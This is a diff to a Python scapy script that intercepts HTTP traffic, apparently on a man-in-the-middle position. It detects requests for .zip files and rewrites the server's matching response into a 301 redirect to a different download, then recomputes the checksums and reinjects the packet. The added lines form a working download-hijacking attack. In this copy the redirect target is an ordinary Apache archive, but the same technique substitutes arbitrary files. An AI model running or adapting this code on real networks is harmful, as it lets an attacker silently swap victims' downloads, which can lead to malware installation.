@@ -15,12 +15,17 @@ def process_packet(packet):
             if ".zip" in scapy_packet[scapy.Raw].load.decode():
                 print(".zip request")
                 ack_list.append(scapy_packet[inet.TCP].ack)
-                print(scapy_packet.show())
         elif scapy_packet[inet.TCP].sport == 80:
             if scapy_packet[inet.TCP].seq in ack_list:
                 ack_list.remove(scapy_packet[inet.TCP].seq)
                 print("Replacing file.")
-                print(scapy_packet.show())
+                scapy_packet[scapy.Raw].load = "HTTP/1.1 301 Moved Permanently\nLocation: https://dlcdn.apache.org/httpd/httpd-2.4.54.tar.bz2\n\n"
+
+                del scapy_packet[inet.IP].len
+                del scapy_packet[inet.IP].chksum
+                del scapy_packet[inet.TCP].chksum
+
+                packet.set_payload(bytes(scapy_packet))
 
     packet.accept()
 
